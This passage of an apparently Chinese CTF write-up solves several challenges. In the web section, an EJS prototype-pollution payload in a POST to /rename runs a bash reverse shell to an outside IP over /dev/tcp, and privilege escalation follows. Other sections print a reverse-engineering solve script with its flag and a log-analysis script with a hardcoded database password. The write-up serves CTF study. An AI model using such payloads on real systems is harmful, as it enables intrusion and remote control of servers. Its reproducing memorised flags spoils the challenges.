function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名成功！&#x27;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&#x27;哒咩哒咩！&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;文件重命名失败！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">findKeyByValue</span>(<span class="params">obj, targetValue</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> obj) &#123;</span><br><span class="line">        <span class="keyword">if</span> (obj.<span class="title function_">hasOwnProperty</span>(key) &amp;&amp; obj[key] === targetValue) &#123;</span><br><span class="line">            <span class="keyword">return</span> key;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>; <span class="comment">// 如果未找到匹配的键名，返回null或其他标识</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">data</span>) &#123;</span><br><span class="line">    data = <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(data)</span><br><span class="line">    <span class="keyword">if</span> (data.<span class="title function_">includes</span>(<span class="string">&#x27;outputFunctionName&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;escape&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;delimiter&#x27;</span>) || data.<span class="title function_">includes</span>(<span class="string">&#x27;localsName&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//设置http</span></span><br><span class="line"><span class="keyword">var</span> server = app.<span class="title function_">listen</span>(<span class="number">8888</span>,<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> port = server.<span class="title function_">address</span>().<span class="property">port</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;http://127.0.0.1:%s&quot;</span>, port)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>rename处是有一个原型链污染的，但是做了一些过滤，我们有四种payload，如下<br>这里直接确认到github的issues<br><a target="_blank" rel="noopener" href="https://github.com/mde/ejs/issues/730">https://github.com/mde/ejs/issues/730</a></p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> templatePath = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;login_register.ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">destructuredLocals</span> = [<span class="string">&quot;__line=__line;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;sleep 10\&quot;&#x27;);//&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> result = ejs.<span class="title function_">renderFile</span>(templatePath, &#123;</span><br><span class="line">    <span class="attr">title</span>:<span class="string">&quot; storeHtml | logins &quot;</span>,</span><br><span class="line">    <span class="attr">buttonHintF</span>:<span class="string">&quot;login&quot;</span>,</span><br><span class="line">    <span class="attr">buttonHintS</span>:<span class="string">&quot;No account? Register now&quot;</span>,</span><br><span class="line">    <span class="attr">hint</span>:<span class="string">&quot;login&quot;</span>,</span><br><span class="line">    <span class="attr">next</span>:<span class="string">&quot;/register&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>最终payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /rename HTTP/1.1</span><br><span class="line">Host: 127.0.0.1:8888</span><br><span class="line">Content-Length: 255</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Accept: */*</span><br><span class="line">Origin: http://1.14.108.193:31999</span><br><span class="line">Referer: http://1.14.108.193:31999/rename</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span><br><span class="line">Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580051; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1706580051; JSESSIONID=4BA66C9FC58B7115625D0C036F9FACC1; PHPSESSID=jeopbml5j07ck0pd7nlfq23nok</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;oldFileName&quot;:&quot;1.js&quot;,&quot;newFileName&quot;:&#123;&quot;__proto__&quot;:&#123;&quot;destructuredLocals&quot;:[&quot;__line=__line;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/8.130.24.188/7775 &lt;&amp;1\&quot;&#x27;);//&quot;]&#125;</span><br><span class="line">&#125;,&quot;uuid&quot;:&quot;7e7f57fd-b62e-4285-bc72-f63a19304960&quot;&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622551220-3b6bb21a-9bc7-4088-8946-2d8bbe6a21c0.png#averageHue=%238f8c58&clientId=u82190a94-e18b-4&from=paste&height=834&id=u085ed9f1&originHeight=1042&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=232739&status=done&style=none&taskId=u393a6455-60e0-487b-ad39-09956dd6f29&title=&width=1267.2" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1706622567140-3980f686-1de0-4008-96e5-87a881775bf5.png#averageHue=%23aa9e83&clientId=u82190a94-e18b-4&from=paste&height=824&id=uc57f66a3&originHeight=1030&originWidth=1630&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=213178&status=done&style=none&taskId=ubed8623c-568f-4cc9-b600-8874369e230&title=&width=1304" alt="image.png"><br>最后只需要cp提权即可</p>
<h3 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a><strong>REVERSE</strong></h3><h4 id="1-MZ"><a href="#1-MZ" class="headerlink" title="1.MZ"></a><strong>1.MZ</strong></h4><p><strong>REVERSE</strong><br><strong>MZ</strong><br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706622852259-74ccd3fb-627d-4cef-8539-1d187ab536e4.png#averageHue=%23fdfdfd&clientId=uc464a076-a7c6-4&from=paste&height=498&id=u873e703e&originHeight=623&originWidth=693&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1730443&status=done&style=none&taskId=u31ff84cf-46a8-4e78-878a-fddb2627f01&title=&width=554.4" alt="image.png"><br>用ida反编译后，分析代码主逻辑<br>可以看出，每轮会取off_7e9000里的值a，然后取值a偏移2<em>v6的值并与当前索引进行比较，相差的绝对值为5即比较成功<br>之后再次更新off_7e9000的值，为值a偏移2</em>v6 + 1<br>编写解密脚本<br>注意，off_7e9000的初始值为0x07E9078，需要0x07E9078之后大约40000bytes的内容<br>该脚本运行后会输出许多可能的结果，根据题目提示，flag会是一段可意义的文本，所以通过设置data4，data5来约束答案，并在输出多个可能的flag后，根据提示选择最可能的flag{Somet1mes_ch0ice_i5_more_import@nt_tHan_effort~!}</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lllll.myCtf.ctf <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line"></span><br><span class="line">data = <span class="comment">#这里需要地址0x07E9078之后大约40000bytes的字节数组</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">data_addr = <span class="number">0x7E9078</span></span><br><span class="line"></span><br><span class="line">really_data = data.copy()</span><br><span class="line">really_addr = <span class="number">0x7E9078</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S&quot;</span>*<span class="number">48</span>)</span><br><span class="line">data3 = <span class="string">&quot;&quot;</span></span><br><span class="line">v9 = []</span><br><span class="line"></span><br><span class="line">data4 = <span class="string">&quot;Somet1mes_ch0ice_i5_more_import&quot;</span></span><br><span class="line">data5 = <span class="string">&quot;Somet1mes&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">really_data,data3,size,res</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">48</span>:</span><br><span class="line">        <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> data3:</span><br><span class="line">        really_addr = getDword(really_data,(<span class="built_in">ord</span>(i)*<span class="number">8</span> + <span class="number">4</span>))</span><br><span class="line">        really_data = data[(really_addr-data_addr):]</span><br><span class="line"></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(really_data),<span class="number">8</span>):</span><br><span class="line">        <span class="keyword">if</span> j == <span class="number">127</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> j &lt; <span class="number">31</span>:</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &gt;= <span class="built_in">len</span>(data5) <span class="keyword">and</span> res[:<span class="built_in">len</span>(data5)] != data5:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(res) &gt;= <span class="built_in">len</span>(data4) <span class="keyword">and</span> res[:<span class="built_in">len</span>(data4)] != data4:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> getDword(really_data,i) - j == <span class="number">5</span>:</span><br><span class="line"></span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            func(really_data,<span class="built_in">chr</span>(j),size+<span class="number">1</span>,res+<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> getDword(really_data,i) - j == -<span class="number">5</span>:</span><br><span class="line">            <span class="comment"># print(res)</span></span><br><span class="line">            func(really_data, <span class="built_in">chr</span>(j), size + <span class="number">1</span>,res+<span class="built_in">chr</span>(j))</span><br><span class="line"></span><br><span class="line">        j += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">func(really_data, data3, <span class="number">0</span>,<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706622928823-b253c2c6-e142-4741-8bae-e73ba7b6e249.png#averageHue=%232f2f2f&clientId=uc464a076-a7c6-4&from=paste&height=66&id=u106065a3&originHeight=82&originWidth=887&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=50442&status=done&style=none&taskId=uaac6d101-6b4b-48f1-a619-e8dd724ba07&title=&width=709.6" alt="image.png"></p>
<h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a><strong>MISC</strong></h3><h4 id="1-2024签到题"><a href="#1-2024签到题" class="headerlink" title="1.2024签到题"></a><strong>1.2024签到题</strong></h4><p>解压得到二维码<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706595139082-c4cae0a1-cd6c-45b1-ab6b-805819e26e9b.png#averageHue=%23c5e3d4&clientId=u356a5c72-a6c7-4&from=paste&height=581&id=u1692e4eb&originHeight=726&originWidth=1169&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=291469&status=done&style=none&taskId=u683267cf-8562-4774-8ecc-ceed8e79c92&title=&width=935.2" alt="image.png"><br>图片属性里有获得flag方式<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706595157543-f96d55f1-85ef-4692-a8f3-54a57928de25.png#averageHue=%23f5f4f2&clientId=u356a5c72-a6c7-4&from=paste&height=66&id=ue7e11612&originHeight=82&originWidth=420&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=5568&status=done&style=none&taskId=u4818cf97-3096-4b3a-a7bf-a89c97feab7&title=&width=336" alt="image.png"><br>关注公众号输入关键字可得flag<br><img src="https://cdn.nlark.com/yuque/0/2024/png/38641338/1706595203380-268fcae7-44d5-467e-aed4-3094b15c69e3.png#averageHue=%23f2f2f2&clientId=u356a5c72-a6c7-4&from=paste&height=219&id=uaa715050&originHeight=288&originWidth=1179&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45814&status=done&style=none&taskId=u1e704400-cfd8-4e2d-8626-8354410877f&title=&width=895" alt="image.png"></p>
<h4 id="2-easy-tables"><a href="#2-easy-tables" class="headerlink" title="2.easy_tables"></a>2.easy_tables</h4><p>利用代码快速查找</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"><span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime, time</span><br><span class="line"></span><br><span class="line"><span class="comment"># 连接到MySQL数据库</span></span><br><span class="line">conn = pymysql.connect(</span><br><span class="line">    host=<span class="string">&#x27;localhost&#x27;</span>,  <span class="comment"># 主机名</span></span><br><span class="line">    user=<span class="string">&#x27;root&#x27;</span>,  <span class="comment"># 用户名</span></span><br><span class="line">    password=<span class="string">&#x27;elysia2004&#x27;</span>,  <span class="comment"># 密码</span></span><br><span class="line">    database=<span class="string">&#x27;test123&#x27;</span>  <span class="comment"># 数据库名</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_time_range</span>(<span class="params">time_range_str</span>):</span><br><span class="line">    start_time_str, end_time_str = time_range_str.split(<span class="string">&quot;~&quot;</span>)</span><br><span class="line">    start_time = datetime.strptime(start_time_str.strip(), <span class="string">&quot;%H:%M:%S&quot;</span>).time()</span><br><span class="line">    end_time = datetime.strptime(end_time_str.strip(), <span class="string">&quot;%H:%M:%S&quot;</span>).time()</span><br><span class="line">    <span class="keyword">return</span> start_time, end_time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_time_in_range</span>(<span class="params">time_str, time_range</span>):</span><br><span class="line">    <span class="comment"># 将字符串转换为时间对象</span></span><br><span class="line">    time_obj = datetime.strptime(time_str, <span class="string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>).time()</span><br><span class="line"></span><br><span class="line">    time_ranges_list = time_range.split(<span class="string">&quot;,&quot;</span>)</span><br><span class="line">    time_ranges = [parse_time_range(time_range_str) <span class="keyword">for</span> time_range_str <span class="keyword">in</span> time_ranges_list]</span><br><span class="line">    <span class="comment"># 指定时间范围</span></span><br><span class="line">    <span class="keyword">for</span> i, (start_time, end_time) <span class="keyword">in</span> <span class="built_in">enumerate</span>(time_ranges, <span class="number">1</span>):</span><br><span class="line">        <span class="comment"># print(f&quot;时间段&#123;i&#125;:&quot;)</span></span><br><span class="line">        <span class="comment"># print(&quot;起始时间:&quot;, start_time)</span></span><br><span class="line">        <span class="comment"># print(&quot;结束时间:&quot;, end_time)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 检查时间是否在指定范围内</span></span><br><span class="line">        <span class="keyword">if</span> start_time &lt;= time_obj &lt;= end_time:</span><br><span class="line">            <span class="comment"># print(True)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># print(False)</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取actionlog内部信息</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_log</span>(<span class="params">from_where=<span class="literal">None</span>, to_where=<span class="literal">None</span></span>):</span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    sql = <span class="string">&quot;SELECT * FROM actionlog LIMIT &quot;</span> + <span class="built_in">str</span>(from_where) + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(to_where)</span><br><span class="line">    <span class="built_in">print</span>(sql)</span><br><span class="line">    cursor.execute(sql)</span><br><span class="line">    rows = cursor.fetchall()</span><br><span class="line">    <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">        <span class="built_in">print</span>(row)</span><br><span class="line">    cursor.close()</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># * 判断是否有错误</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_error</span>():</span><br><span class="line">    result = <span class="string">&quot;在actionlog.csv表⾥编号【&#123;&#125;】处的账号【&#123;&#125;】对表【&#123;&#125;】的操作时间为【&#123;&#125;】，其可操作时间段为【&#123;&#125;】。违规操作【&#123;&#125;】, 按题⽬要求构造出编号: &#123;&#125;&quot;</span></span><br><span class="line">    cursor = conn.cursor()</span><br><span class="line">    from_where = <span class="number">0</span></span><br><span class="line">    to_where = <span class="number">1000</span></span><br><span class="line">    error_id = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">1</span>, <span class="number">11</span>):</span><br><span class="line">        <span class="comment"># print(from_where + (i - 1) * 1000, to_where * i)</span></span><br><span class="line">        sql = <span class="string">&quot;SELECT * FROM actionlog LIMIT &quot;</span> + <span class="built_in">str</span>(from_where + (i - <span class="number">1</span>) * <span class="number">1000</span>) + <span class="string">&#x27;,&#x27;</span> + <span class="built_in">str</span>(to_where * i)</span><br><span class="line">        <span class="built_in">print</span>(sql)</span><br><span class="line">        cursor.execute(sql)</span><br><span class="line">        rows = cursor.fetchall()</span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> rows:</span><br><span class="line">            <span class="comment"># print(row)</span></span><br><span class="line">            log_id = row[<span class="number">0</span>]</span><br><span class="line">            log_name = row[<span class="number">1</span>]</span><br><span class="line">            log_time = row[<span class="number">2</span>]</span><br><span class="line">            log_action = row[<span class="number">3</span>]</span><br><span class="line">            log_table = <span class="string">&quot;ss&quot;</span></span><br><span class="line">            sql_type = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            user_id = <span class="number">0</span></span><br><span class="line">            <span class="comment"># 提取表名</span></span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                <span class="comment"># else:</span></span><br><span class="line">                <span class="comment">#     print(&quot;未找到select表名&quot;)</span></span><br><span class="line">                <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\bINSERT\s+INTO\s+([a-zA-Z_][a-zA-Z0-9_]*)&#x27;</span>, log_action, re.IGNORECASE)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    log_table = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                    sql_type = <span class="string">&#x27;insert&#x27;</span></span><br><span class="line">                    <span class="comment"># print(&quot;insert表名:&quot;, log_table)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="comment"># else:</span></span><br><span class="line">                <span class="comment">#     print(&quot;未找到insert表名&quot;)</span></span><br><span class="line">                <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\bUPDATE\s+([a-zA-Z_][a-zA-Z0-9_]*)&#x27;</span>, log_action, re.IGNORECASE)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    log_table = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                    sql_type = <span class="string">&#x27;update&#x27;</span></span><br><span class="line">                    <span class="comment"># print(&quot;update表名:&quot;, log_table)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="comment"># else:</span></span><br><span class="line">                <span class="comment">#     print(&quot;未找到update表名&quot;)</span></span><br><span class="line">                <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\bDELETE\s+FROM\s+([a-zA-Z_][a-zA-Z0-9_]*)&#x27;</span>, log_action, re.IGNORECASE)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    log_table = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                    sql_type = <span class="string">&#x27;delete&#x27;</span></span><br><span class="line">                    <span class="comment"># print(&quot;delete表名:&quot;, log_table)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="comment"># else:</span></span><br><span class="line">                <span class="comment"># print(&quot;未找到delete表名&quot;)</span></span><br><span class="line">                <span class="keyword">match</span> = re.search(<span class="string">r&#x27;\bFROM\s+([a-zA-Z_][a-zA-Z0-9_]*)\b&#x27;</span>, log_action, re.IGNORECASE)</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                    log_table = <span class="keyword">match</span>.group(<span class="number">1</span>)</span><br><span class="line">                    sql_type = <span class="string">&#x27;select&#x27;</span></span><br><span class="line">                    <span class="comment"># print(&quot;select表名:&quot;, log_table)</span></span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="comment"># print(log_table, sql_type)</span></span><br><span class="line">            user_permission_id = <span class="number">0</span></span><br><span class="line">            <span class="comment"># ! 不存在的账号执⾏了操作</span></span><br><span class="line">            sql_1 = <span class="string">&quot;SELECT * FROM users WHERE 账号=&#x27;&quot;</span> + log_name + <span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">            cursor.execute(sql_1)</span><br><span class="line">            res = 